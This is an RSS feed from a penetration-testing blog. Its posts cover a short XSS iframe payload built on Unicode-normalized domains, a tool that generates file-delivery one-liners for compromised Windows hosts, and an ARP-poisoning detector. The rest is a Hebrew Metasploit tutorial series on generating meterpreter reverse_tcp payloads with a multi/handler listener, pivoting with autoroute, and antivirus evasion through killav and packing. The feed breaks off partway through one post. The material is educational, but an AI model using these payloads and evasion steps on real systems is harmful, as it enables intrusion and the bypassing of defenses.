@@ -1,0 +1,385 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Man in the Middle</title>
+	<atom:link href="http://mitm.win/feed/" rel="self" type="application/rss+xml" />
+	<link>http://mitm.win</link>
+	<description></description>
+	<lastBuildDate>Tue, 04 Dec 2018 21:12:03 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.8</generator>
+	<item>
+		<title>The Journey to Short XSS Payload</title>
+		<link>http://mitm.win/the-journey-to-short-xss-payload/</link>
+		<pubDate>Tue, 13 Sep 2016 16:47:34 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Web Applications]]></category>
+		<category><![CDATA[XSS]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=154</guid>
+		<description><![CDATA[TL;DR &#8211; Using Unicode Normalization for short domain names. Example: &#60;iframe src=//㎉.ga&#62; Motivation Sometime during a web application testing I come across an input value with length restriction. I am not talking of course about html parameter maxlength which you can easily bypass. The real problem comes when the server-side code limits the length of your payload. [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p><strong>TL;DR</strong> &#8211; Using Unicode Normalization for short domain names. Example: <code>&lt;iframe src=//㎉.ga&gt;</code></p>
+<p><img class="alignnone wp-image-172" src="http://mitm.co.il/contents/data/2016/09/UnicodeDomainSearch-300x50.png" alt="unicodedomainsearch" width="666" height="111" srcset="http://mitm.win/contents/data/2016/09/UnicodeDomainSearch-300x50.png 300w, http://mitm.win/contents/data/2016/09/UnicodeDomainSearch-768x129.png 768w, http://mitm.win/contents/data/2016/09/UnicodeDomainSearch.png 856w" sizes="(max-width: 666px) 100vw, 666px" /></p>
+<h2>Motivation</h2>
+<p>Sometime during a web application testing I come across an input value with length restriction.</p>
+<p>I am not talking of course about html parameter <code>maxlength</code> which you can easily bypass. The real problem comes when the server-side code limits the length of your payload.</p>
+<p>There are some great articles about short XSS payload (you can find links at the bottom), and I decided to focus on getting short domain name without spending a lot of money.</p>
+<p>Buying a short domain name is an expensive business. For example <code>r.top</code> can cost you $194,596.97/year <a href="https://www.namecheap.com/domains/registration/results.aspx?domain=r">here </a></p>
+<p>For those of us that can&#8217;t afford one letter domain I can suggest using Unicode Normalization. This technique can help us by using a longer domain name with the same amount of (Unicode) characters.</p>
+<h2>What is Unicode Normalization?</h2>
+<p><span id="more-154"></span></p>
+<p>Some of the Unicode characters are more complex than ASCII characters so in the normalization process one Unicode character can convert to multiple ASCII characters. For example the Unicode character <code>Ⅵ</code> (U+2165) will be converted to ASCII <code>vi</code>. You can try this your self – enter in the URL <a href="http://Ⅵ.com">http://Ⅵ.com</a> and your browser will access the website at <a href="http://vi.com">http://vi.com</a></p>
+<p>The idea of using a single Unicode character for shorter URLs is <a href="https://patzke.org/files/OWASP_Cologne-20141030-Unicode.pdf">nothing new</a> and recently I did a little research in order to find the best and cheapest way to acquire a short domain using Unicode characters.</p>
+<h2>Cost-Effective Domain Names</h2>
+<p>First of all I had to find some Unicode characters that contain multiple characters after normalization. To accomplish that I wrote a little C# program that normalize all Unicode characters and count the length of the result. You can find the source code <a href="https://gist.github.com/mitm-dev/776b94634af2d44b2a2338affcf689c9">here</a></p>
+<p><img class="alignnone wp-image-171" src="http://mitm.co.il/contents/data/2016/09/findLongUnicode-300x81.png" alt="findlongunicode" width="474" height="128" srcset="http://mitm.win/contents/data/2016/09/findLongUnicode-300x81.png 300w, http://mitm.win/contents/data/2016/09/findLongUnicode-768x208.png 768w, http://mitm.win/contents/data/2016/09/findLongUnicode.png 861w" sizes="(max-width: 474px) 100vw, 474px" /></p>
+<p>I got 72 matches, but only 3 of them contains only simple ASCII English characters and can be used in a domain name:</p>
+<p><code>U+2167 - VIII<br />
+U+2177 - viii<br />
+U+3389 - kcal</code></p>
+<p>Since domain names are case insensitive, we have only 2 viable options: <code>viii</code> and <code>kcal</code>.</p>
+<h2>Even Shorter &#8211; Domain Suffixes</h2>
+<p>In order to find the shortest possible domain name I looked also on domain suffixes. If we can find single Unicode character that converted to a valid domain suffix after normalization, we can get even shorter domain name.</p>
+<p>So my next step was to get a list of all domain suffixes. After some google search and text formatting I got a long text file contains all available domain suffixes. You can find the file <a href="https://gist.github.com/mitm-dev/9b4ed9c80859bef1ccfd5c27994798ee">here</a>. I wrote another little C# program that normalize all Unicode characters and compare them to my domain suffixes list. You can find source code <a href="https://gist.github.com/mitm-dev/7f44a7ee703e7f6a319d7d28c9358a5a">here</a></p>
+<p><img class="alignnone wp-image-170" src="http://mitm.co.il/contents/data/2016/09/UnicodeDomainSuffixes-300x94.png" alt="unicodedomainsuffixes" width="517" height="162" srcset="http://mitm.win/contents/data/2016/09/UnicodeDomainSuffixes-300x94.png 300w, http://mitm.win/contents/data/2016/09/UnicodeDomainSuffixes-768x240.png 768w, http://mitm.win/contents/data/2016/09/UnicodeDomainSuffixes-1024x320.png 1024w, http://mitm.win/contents/data/2016/09/UnicodeDomainSuffixes.png 1033w" sizes="(max-width: 517px) 100vw, 517px" /></p>
+<p>It turns out that there are 10 Unicode characters that are valid domain suffixes after normalization:</p>
+<p><code>U+33D7 - PH<br />
+U+32CF - LTD<br />
+U+3399 - fm<br />
+U+339D - cm<br />
+U+33B3 - ms<br />
+U+33BA - pW<br />
+U+33C4 - cc<br />
+U+33C9 - Gy<br />
+U+33CC - in<br />
+U+3374 - bar</code></p>
+<h2>Summary</h2>
+<p>In conclusion it is completely possible to purchase a relatively long domain (7 characters) and shorten it using Unicode characters to just 3 characters. For example <code>viii.ms</code> (7 characters) or in Unicode: <code>ⅷ.㎳</code> (3 characters)</p>
+<p>Another great option is using free domains. for example by using <a href="http://www.freenom.com">http://www.freenom.com</a> you can register a free domain with a short suffix such as <code>.tk</code></p>
+<p>You can use <code>㎉.ga</code> for POC by inducing in your XSS payload something like this: <code>&lt;iframe src=//㎉.ga&gt;</code></p>
+<p>Have Fun and Happy Hacking</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>JavaScript Automated File Deliverer</title>
+		<link>http://mitm.win/javascript-automated-file-deliverer/</link>
+		<pubDate>Thu, 31 Mar 2016 20:51:48 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Post Exploitation]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=145</guid>
+		<description><![CDATA[This little tool was build to help you during a penetration test. http://mitm.win/JSAFD/ The main function is file deliverer generator to help you upload file to a compromised computer. You can set the file name (in source and destination) and the address of the computer hosting the file, and this tool will generate a quick and simple [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>This little tool was build to help you during a penetration test.</p>
+<p><a href="http://mitm.win/JSAFD/" target="_blank" rel="noopener">http://mitm.win/JSAFD/</a></p>
+<p><a href="http://mitm.co.il/contents/data/2016/03/cap1.png" rel="attachment wp-att-150"><img class="alignnone wp-image-150" src="http://mitm.co.il/contents/data/2016/03/cap1-276x300.png" alt="cap1" width="433" height="471" srcset="http://mitm.win/contents/data/2016/03/cap1-276x300.png 276w, http://mitm.win/contents/data/2016/03/cap1.png 560w" sizes="(max-width: 433px) 100vw, 433px" /></a></p>
+<p>The main function is file deliverer generator to help you upload file to a compromised computer.</p>
+<p><span id="more-145"></span></p>
+<p>You can set the file name (in source and destination) and the address of the computer hosting the file, and this tool will generate a quick and simple one-liners for you to run on the compromised machine. You can choose to upload the file using HTTP download via powershell, vbscript and bitsadmin, FTP download or TFTP download all using native windows tools that available by default.</p>
+<p>You can also find here some portable servers (http, ftp and tftp) to host the files, A simple yet powerful powershell command encoder, some useful commands for post exploitation and more.</p>
+<p>This tool is pure client side &#8211; HTML, JS and CSS so you can run it on your computer without Internet connection. It does not send any of your information to the Internet.</p>
+<p>In case  you have some more ideas and powerful commands and technics that I can include in this tool, let me know so we can make this tool more useful.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Arp Watcher &#8211; Is someone trying to poison you?</title>
+		<link>http://mitm.win/arp-watcher/</link>
+		<pubDate>Wed, 17 Jun 2015 16:12:57 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[ARP Poisoning]]></category>
+		<category><![CDATA[Man in the middle]]></category>
+		<category><![CDATA[Source Code]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=131</guid>
+		<description><![CDATA[ARP Watcher is a small utility that help you notice if someone in your network is trying to attack you with ARP Poisoning. ARP poisoning (also referred as ARP Spoofing) is a type of man in the middle attack that allow an attacker to redirect all your network activity through a malicious computer that can [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>ARP Watcher is a small utility that help you notice if someone in your network is trying to attack you with ARP Poisoning.</p>
+<p>ARP poisoning (also referred as ARP Spoofing) is a type of man in the middle attack that allow an attacker to redirect all your network activity through a malicious computer that can view and manipulate your data.</p>
+<p><span id="more-131"></span></p>
+<p>In order to perform an ARP poisoning the attacker send malicious ARP packets, and change your default gateway to his computer. All of your network activity outside your LAN will go through your gateway, and in the case of an ARP poisoning through the attacker computer. You can read more about this attack <a href="https://en.wikipedia.org/wiki/ARP_spoofing">here</a></p>
+<p>ARP Watcher run in the background and monitor the MAC address of your default gateway. When it changes, ARP Watcher will alert you on a possible ARP poisoning attack and change the tray icon into red.</p>
+<p><img class="alignnone size-medium wp-image-134" src="http://mitm.co.il/contents/data/2015/06/arpwatcher-red.png" alt="arpwatcher-red" width="296" height="93" /></p>
+<p>Please notice that when connecting to another network (for example connect to a different wifi network) ARP Watcher may alert because the gateway is changed. This is normal behaviour and in this case you can safely hit reset in the context menu to mark the new gateway as valid.</p>
+<p><img class="alignnone size-full wp-image-133" src="http://mitm.co.il/contents/data/2015/06/arpwatcher-menu.png" alt="arpwatcher-menu" width="126" height="63" /></p>
+<p>You can <a href="http://mitm.co.il/uploads/ArpWatcher.exe">download ARP Watcher here</a></p>
+<p>Source code is available at <a href="https://github.com/mitm-dev/ArpWatcher">GitHub</a></p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Zero Wine &#8211; An easy sandbox for malware analysis</title>
+		<link>http://mitm.win/start-with-zerowine/</link>
+		<pubDate>Mon, 06 Apr 2015 13:16:04 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Malware Analysis]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=108</guid>
+		<description><![CDATA[Zero Wine is a simple yet powerful open source sandbox for malware analysis. It uses Wine on Linux to run windows EXE files in a monitored virtual machine. Notice &#8211; Wine is NOT full sandbox! malwares CAN ESCAPE to OS! Use with caution! I recommend using the fork Zero Wine Tryouts It has a prebuilt VMware [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p><a href="http://zerowine.sourceforge.net/" target="_blank">Zero Wine</a> is a simple yet powerful open source sandbox for malware analysis.</p>
+<p>It uses Wine on Linux to run windows EXE files in a monitored virtual machine.</p>
+<h3><strong>Notice &#8211; Wine is NOT full sandbox! malwares CAN ESCAPE to OS! Use with caution!</strong></h3>
+<p>I recommend using the fork <a href="http://zerowine-tryout.sourceforge.net/" target="_blank">Zero Wine Tryouts</a><br />
+It has a prebuilt VMware image ready for download and its quite effective and easy to use.</p>
+<p>However there are some important details missing from the documentation on the website,<br />
+so here it is:<br />
+<span id="more-108"></span></p>
+<p><span style="text-decoration: underline;"><strong>All you need to know in order to start using Zero Wine Tryouts</strong></span></p>
+<ul>
+<li>Install VMware player / workstation</li>
+<li>Download the <a href="http://downloads.sourceforge.net/zerowine-tryout/zerowine-tryout-alpha5-image.7z" target="_blank">VMware image</a></li>
+<li>extract the 7z file and start the VM</li>
+<li>login to console with:</li>
+</ul>
+<p><code>user name: root</code><br />
+<code>password: zerowine1</code></p>
+<ul>
+<ul>
+<li>you also can login as:<br />
+<code>user name: malware</code><br />
+<code>password: malware1</code></li>
+</ul>
+</ul>
+<ul>
+<li>Set IP and default gateway using:<br />
+<code>mcedit /etc/network/interfaces</code><br />
+and edit the interfaces file to match your IP range and default gateway</li>
+</ul>
+<ul>
+<li>Apply the changes with:<br />
+<code>ifdown -a</code><br />
+<code>ifup -a</code></li>
+</ul>
+<p>Now you can access the web interface on URL: <code>http://&lt;your-zerowine-ip&gt;:8000</code><br />
+and upload your malware files:</p>
+<p><a href="http://mitm.co.il/contents/data/2015/04/zerowine.png"><img class="alignnone wp-image-112 size-large" src="http://mitm.co.il/contents/data/2015/04/zerowine-1024x600.png" alt="zerowine" width="627" height="367" srcset="http://mitm.win/contents/data/2015/04/zerowine-1024x600.png 1024w, http://mitm.win/contents/data/2015/04/zerowine-300x176.png 300w, http://mitm.win/contents/data/2015/04/zerowine.png 1104w" sizes="(max-width: 627px) 100vw, 627px" /></a></p>
+<p>After hitting submit you will have to wait a few minutes to get answer from the server. In this time the file will be analysed and you will get the full report:</p>
+<p><img class="alignnone wp-image-111 size-full" src="http://mitm.co.il/contents/data/2015/04/zerowine2.png" alt="zerowine2" width="800" height="592" srcset="http://mitm.win/contents/data/2015/04/zerowine2.png 800w, http://mitm.win/contents/data/2015/04/zerowine2-300x222.png 300w" sizes="(max-width: 800px) 100vw, 800px" /></p>
+<p>The report include static analysis such as HASH calculation, strings extractions and PE header parser etc.</p>
+<p>It also include full dynamic analysis with full File system access, Registry access, Network dump and more.</p>
+<p>Have Fun!</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Metasploit 101 &#8211; Part 7 &#8211; Anti-Virus Evasion</title>
+		<link>http://mitm.win/metasploit-101-part7/</link>
+		<pubDate>Sat, 14 Feb 2015 22:59:54 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Metasploit]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=92</guid>
+		<description><![CDATA[כל יצרניות האנטי וירוס מכירות את metasploit ובהתאם מייצרות חתימות על הכלים ש-metasploit מכיל ומייצר לכן אנחנו עלולים להיחסם ע&#8221;י אנטי וירוס בחלק מההתקפות. מה אפשר לעשות? killav – אם הצלחנו להשיג session של meterpreter ניתן להריץ את הפקודה run killav שאמורה לעצור את האנטי וירוס. יש לציין שהיא לא עובדת בחלק גדול מהמקרים. שימוש [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p dir="rtl">כל יצרניות האנטי וירוס מכירות את metasploit ובהתאם מייצרות חתימות על הכלים ש-metasploit מכיל ומייצר לכן אנחנו עלולים להיחסם ע&#8221;י אנטי וירוס בחלק מההתקפות.</p>
+<p dir="rtl">
+מה אפשר לעשות?</p>
+<p dir="rtl">
+<strong>killav</strong> – אם הצלחנו להשיג session של meterpreter ניתן להריץ את הפקודה run killav שאמורה לעצור את האנטי וירוס. יש לציין שהיא לא עובדת בחלק גדול מהמקרים.</p>
+<p dir="rtl"><span id="more-92"></span><strong>שימוש ב-exploits שמשפיע רק על הזיכרון</strong> – אם ה-exploit שלנו מזריק קוד לזיכרון ולא לדיסק, האנטי וירוס לא סורק אותו ואנחנו נוכל לרוץ.</p>
+<p dir="rtl"><strong>Packing</strong> – לגבי exploitים שאינם רצים מהזיכרון (כמו psexec או binary payloads) ניתן לארוז את הקבצים ע&#8221;י packer וכך להמנע מזיהוי מבוסס חתימות.<br />
+ב-Binary payloads אנחנו מייצרים קובץ בינארי לכן אין שום בעיה לארוז אותו ב-packer<br />
+לגבי exploits אחרים כגון psexec ניתן להשתמש בפרמטר EXE::Custom אם נשים בו נתיב של קובץ EXE זה הקובץ שה-exploit יריץ על השרת המותקף. אנחנו צריכים לדאוג שה-EXE הזה לא יזוהה באנטי וירוס</p>
+<p dir="rtl">
+<a href="https://www.veil-framework.com" target="_blank"><strong>Veil-Framework</strong></a> – ניתן להיעזר בכלים של Veil-Framework שמיועדים בדיוק למטרה זו.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Metasploit 101 – Part 6 – Binary Payloads</title>
+		<link>http://mitm.win/metasploit-101-part6/</link>
+		<pubDate>Wed, 21 Jan 2015 22:20:53 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Metasploit]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=83</guid>
+		<description><![CDATA[כל payload של Metasploit ניתן לארוז כקובץ ריצה עצמאי כך שהרצה שלו תבצע את תוכן ה-payload &#8211; בדרך כלל חיבור של Shell למחשב שלנו היכולת הזו שימושית למצב שבו אנחנו יכולים להריץ קובץ / סקריפט על שרת מרוחק למרות שאין לנו exploit מתאים. איך עושים את זה: יש לטעון את המודול payload המתאים למשל: use [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p dir="rtl">כל payload של Metasploit ניתן לארוז כקובץ ריצה עצמאי כך שהרצה שלו תבצע את תוכן ה-payload &#8211; בדרך כלל חיבור של Shell למחשב שלנו</p>
+<p dir="rtl">היכולת הזו שימושית למצב שבו אנחנו יכולים להריץ קובץ / סקריפט על שרת מרוחק למרות שאין לנו exploit מתאים.</p>
+<p dir="rtl"><span style="text-decoration: underline;">איך עושים את זה:</span><br />
+יש לטעון את המודול payload המתאים למשל:</p>
+<p><code>use payload/windows/meterpreter/reverse_tcp</code></p>
+<p dir="rtl"><span id="more-83"></span>יש לתת ערכים לפרמטרים הרלוונטים:</p>
+<p><code>msf payload(reverse_tcp) &gt; set LHOST 192.168.1.53<br />
+LHOST =&gt; 192.168.1.53<br />
+msf payload(reverse_tcp) &gt; set LPORT 5555<br />
+LPORT =&gt; 5555</code></p>
+<p dir="rtl">ניתן לוודא זאת ע&#8221;י show options<br />
+כדי לייצר את הבינארי יש להשתמש בפקודה generate למשל:</p>
+<p><code>generate –f c:\\tools\\meterpreter.exe –t exe</code></p>
+<p dir="rtl">הפקודה הנ&#8221;ל תייצר קובץ EXE תחת c:\tools\meterpreter.exe שמכיל את ה-payload שבחרנו יחד עם הפרמטרים שהזנו.<br />
+כאשר נריץ את הקובץ יפתח session של meterpreter מול המחשב שלנו.</p>
+<p dir="rtl">כמה נקודות שחשוב לזכור:</p>
+<ul dir="rtl">
+<li>כדי להשלים את הפעולה יש להשתמש ב-multi handler כמפורט בהמשך.</li>
+<li>ניתן לראות אפשרויות נוספות של generate ע&#8221;י generate –h.</li>
+<li>יש עוד שלל סוגי קבצים שהפקודה יודעת ליצור למשל vbscript, dll, aspx ועוד ועוד.</li>
+<li>סביר להניח שהקובץ שנוצר יזוהה וייחסם ע&#8221;י תוכנת האנטי וירוס בחלק הבא נדבר על התמודדות עם אנטי וירוס.</li>
+</ul>
+<p dir="rtl"><span style="text-decoration: underline;">Multi handler</span></p>
+<p dir="rtl">כאשר מריצים exploit שכולל payload שיוצר session אינטרקטיבי, Metasploit אוטומטית מאזין / מתחבר לפורט הרלוונטי על השרת.<br />
+לפעמים אנחנו נרצה לבצע זאת באופן ידני. למשל כאשר מריצים binary payload ההרצה של ה-payload היא במנותק מ-Metasploit לכן לא תיפתח אוטומטית ההתחברות לפורט.<br />
+Metasploit מאפשר לנו לעשות זאת ע&#8221;י שימוש במודול exploit/multi/handler</p>
+<p dir="rtl"><span style="text-decoration: underline;"> איך עושים את זה:</span><br />
+מייצרים binary payload לפי ההוראות בסעיף הקודם<br />
+טוענים את המודול exploit/multi/handler</p>
+<p><code>use exploit/multi/handler</code></p>
+<p dir="rtl">בוחרים את ה-payload הרלוונטי. יש לבחור בדיוק את אותו payload ששמנו ב-binary:</p>
+<p><code>set payload windows/meterpreter/reverse_tcp</code></p>
+<p dir="rtl">מגדירים את שאר הפרמטרים, כמו שהגדרנו ב-binary:</p>
+<p><code>msf exploit(handler) &gt; set LHOST 192.168.1.53<br />
+LHOST =&gt; 192.168.1.53<br />
+msf exploit(handler) &gt; set LPORT 5555<br />
+LPORT =&gt; 5555</code></p>
+<p dir="rtl">ומריצים!</p>
+<p><code>msf exploit(handler) &gt; exploit</code></p>
+<p>[*] Started reverse handler on 192.168.1.53 :5555<br />
+[*] Starting the payload handler&#8230;</p>
+<p dir="rtl">כרגע metasploit מאזין לפורט שבחרנו ומחכה לחיבור<br />
+ברגע שנריץ את ה-binary payload על השרת המותקף, יווצר חיבור ונקבל session פעיל</p>
+<p><code>[*] Sending stage (752128 bytes) to 192.168.1.53</code></p>
+<p>meterpreter &gt;</p>
+<p dir="rtl">וקיבלנו Meterpreter Shell חביב</p>
+<p dir="rtl"><a href="/metasploit-101-part7">לחלק האחרון &#8211; Anti-Virus Evasion</a></p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Metasploit 101 – Part 5 &#8211; Pivoting</title>
+		<link>http://mitm.win/metasploit-101-part5/</link>
+		<pubDate>Mon, 19 Jan 2015 20:01:04 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Metasploit]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=70</guid>
+		<description><![CDATA[אחד הכלים ש-meterpreter מציע הוא proxy המאפשר לנו לבצע התקפות דרך מחשב שהשגנו עליו שליטה. היכולת הזו יכולה להיות שימושית מאוד כדי לגשת לרשת שאין לנו גישת FW אליה, כדי לטשטש עקבות ועוד. בשביל לבצע פעולה זו לא דרושה לנו הרשאת מנהל על המחשב המותקף. אם השגנו יוזר רגיל בלבד ולא הצלחנו להעלות את ההרשאות, אחד [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p dir="rtl" style="text-align: right;">אחד הכלים ש-meterpreter מציע הוא proxy המאפשר לנו לבצע התקפות דרך מחשב שהשגנו עליו שליטה.</p>
+<p dir="rtl" style="text-align: right;">היכולת הזו יכולה להיות שימושית מאוד כדי לגשת לרשת שאין לנו גישת FW אליה, כדי לטשטש עקבות ועוד.</p>
+<p dir="rtl" style="text-align: right;">בשביל לבצע פעולה זו לא דרושה לנו הרשאת מנהל על המחשב המותקף. אם השגנו יוזר רגיל בלבד ולא הצלחנו להעלות את ההרשאות, אחד מהדברים שאנחנו כן יכולים לעשות הוא pivoting</p>
+<p dir="rtl" style="text-align: right;"><span style="text-decoration: underline;">הדבר מתבצע כך:</span></p>
+<p dir="rtl" style="text-align: right;"><span id="more-70"></span>ראשית יש להשיג session פעיל של meterpreter<br />
+בתוך meterpreter יש להריץ את הפקודה הבאה:</p>
+<p><code>run autoroute –s 192.168.123.0 –n 255.255.255.0</code></p>
+<p dir="rtl" style="text-align: right;">אחרי שהפקודה רצה בהצלחה ניתן לצפות בטבלת הניתוב ע&#8221;י הרצת run autoroute –p<br />
+ברגע שהגדרנו את זה כל פעולה שנעשה מתוך metasploit על הסגמנט 192.168.123.0/24 תתבצע דרך ה-session של meterpreter שמתפקד כ-proxy<br />
+נוכל להריץ את הפקודה background וה-session המנתב יעבור לרקע (אבל יישאר פעיל)</p>
+<p dir="rtl" style="text-align: right;"><span style="text-decoration: underline;">דוגמה מעשית:</span></p>
+<p dir="rtl" style="text-align: right;">קיים סגמנט שרתים 172.82.5.0/24 השרתים מוגנים מאחורי FW וסריקת רשת מגלה רק פורט 80 על שרת אחד מתוכם.<br />
+נניח והתחברנו לאפליקציה שרצה על אותו שרת ומצאנו בה פרצה שמאפשרת לנו השתלטות עליו.<br />
+נקים session של meterpreter על השרת, נריץ עליו את הפקודה:</p>
+<p><code>run autoroute –s 172.82.5.0 –n 255.255.255.0</code></p>
+<p dir="rtl" style="text-align: right;">ואז נריץ background.<br />
+כעת נסרוק שוב (בעזרת סורק מתוך metasploit) את הסגמנט והפעם הסריקה תרוץ דרך השרת הפגיע שנמצא בסגמנט המוגן ונוכל למצוא עוד פורטים רבים פתוחים.<br />
+כל exploit שנריץ על אחד מהשרתים האלה גם כן ירוץ דרך השרת הפגיע.</p>
+<p dir="rtl" style="text-align: right;"><a href="/metasploit-101-part6">לחלק הבא &#8211; Binary Payloads</a></p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Metasploit 101 – Part 4 &#8211; Ports Ports Ports</title>
+		<link>http://mitm.win/metasploit-101-part4/</link>
+		<pubDate>Mon, 19 Jan 2015 19:50:32 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Metasploit]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=65</guid>
+		<description><![CDATA[חלק מה-payloads שב-Metasploit יוצרים לנו session אינטרקטיבי מול השרת המותקף. ה-session יכול להיות של meterpreter או shell רגיל אבל בכל מקרה ה-payload דורש פורט פתוח. יש שתי שיטות בהן נוכל להקים session: 1. Bind – ה-exploit שירוץ על השרת המותקף יתחיל להאזין לפורט שהגדרנו לו, והמחשב שלנו יתחבר לשרת המותקף 2. Reverse Connection / Reverse [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p dir="rtl" style="text-align: right;">חלק מה-payloads שב-Metasploit יוצרים לנו session אינטרקטיבי מול השרת המותקף. ה-session יכול להיות של meterpreter או shell רגיל אבל בכל מקרה ה-payload דורש פורט פתוח.</p>
+<p dir="rtl" style="text-align: right;">יש שתי שיטות בהן נוכל להקים session:</p>
+<p dir="rtl" style="text-align: right;">1. Bind – ה-exploit שירוץ על השרת המותקף יתחיל להאזין לפורט שהגדרנו לו, והמחשב שלנו יתחבר לשרת המותקף</p>
+<p dir="rtl" style="text-align: right;">2. Reverse Connection / Reverse Shell – המחשב שלנו יאזין לפורט שהגדרנו וה-exploit שירוץ על השרת המותקף יתחבר למחשב שלנו. היתרון בשיטה זו היא שלעיתים קרובות השרת פתוח למשתמשים ביותר פורטים מאשר המשתמשים פתוחים לשרת.</p>
+<p dir="rtl" style="text-align: right;">איך בוחרים פורט כזה?</p>
+<p dir="rtl" style="text-align: right;"><span id="more-65"></span>המטרה שלנו היא למצוא פורט שפתוח ב-FW אבל אין אף תוכנה שמאזינה עליו (כדי למנוע התנגשויות). בכלי הסריקה (כמו nmap) פורט כזה יופיע כ-closed (רק להזכיר – open משמע פורט פתוח שיש מי שמאזין עליו, ו-filtered משמע חסום ב-FW)</p>
+<p dir="rtl" style="text-align: right;">נוכל לסרוק את השרת ולחפש פורטים שהם closed. אם מצאנו פורט כזה אנחנו נבחר payload מסוג &#8220;bind_tcp&#8221; או &#8220;bind_udp&#8221; ואת מספר הפורט נגדיר כ-LPORT.</p>
+<p dir="rtl" style="text-align: right;">טיפ: לפעמים יהיו פתוחים פורטים גבוהים (40,000 ומעלה) אז לא לשכוח לבדוק אותם.</p>
+<p dir="rtl" style="text-align: right;">אם לא מצאנו ננסה לבצע סריקה הפוכה – מהשרת נסרוק את המחשב שלנו ושוב נחפש פורט closed. אם מצאנו נבחר payload מסוג &#8220;reverse_tcp&#8221; או &#8220;reverse_udp&#8221; ואת מספר הפורט נגדיר כ-LPORT. במקרה זה יש גם להגדיר את LHOST בתור המחשב שלנו.</p>
+<p dir="rtl" style="text-align: right;"><span style="text-decoration: underline;">טיפ:</span> כדי לבצע סריקת רשת לא צריך הרשאות גבוהות. אם השגנו משתמש רגיל בשרת זה מספיק לנו בשביל לסרוק ולחפש פורטים פתוחים.</p>
+<p dir="rtl" style="text-align: right;">אם לא ניתן לבצע סריקה מהשרת (כי אין לנו דריסת רגל בשרת) נוכל להשתמש ב-reverse_tcp_allports מה שינסה להתחבר אלינו בכל פורט אפשרי (1-65535). זה ייקח זמן, אבל אם יש פורט כלשהוא פתוח אנחנו נקבל session</p>
+<p dir="rtl" style="text-align: right;">אם אין אף פורט פתוח שאנחנו יכולים להשתמש בו, ניאלץ להריץ payload שלא פותח session אינטרקטיבי – למשל payload/windows/exec שמפעיל קובץ ריצה על השרת או payload/cmd/windows/adduser שמוסיף יוזר.</p>
+<p dir="rtl" style="text-align: right;"><a href="/metasploit-101-part5">לחלק הבא – Pivoting</a></p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Metasploit 101 – Part 3 &#8211; Meterpreter</title>
+		<link>http://mitm.win/metasploit-101-part3/</link>
+		<pubDate>Sun, 18 Jan 2015 22:12:09 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Metasploit]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=54</guid>
+		<description><![CDATA[אחד מה-payloads השימושיים של Metasploit הוא meterpreter. השם מייצג Meta Interpreter ומדובר בכלי שיודע להריץ שלל שפות תכנות ושפות סקריפט. ל-meterpreter יש יכולת לעבודה עם מערכת הקבצים, עם ה-registry עם הרשת (network) ועוד מעבר לכך יש לו הרבה מאוד יכולות שימושיות: Shell – פותח שורת פקודה סטנדרטית (cmd ב-windows למשל) Migrate – עובר ל-process אחר. אם [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p dir="rtl" style="text-align: right;">אחד מה-payloads השימושיים של Metasploit הוא meterpreter.<br />
+השם מייצג Meta Interpreter ומדובר בכלי שיודע להריץ שלל שפות תכנות ושפות סקריפט.<br />
+ל-meterpreter יש יכולת לעבודה עם מערכת הקבצים, עם ה-registry עם הרשת (network) ועוד<br />
+מעבר לכך יש לו הרבה מאוד יכולות שימושיות:</p>
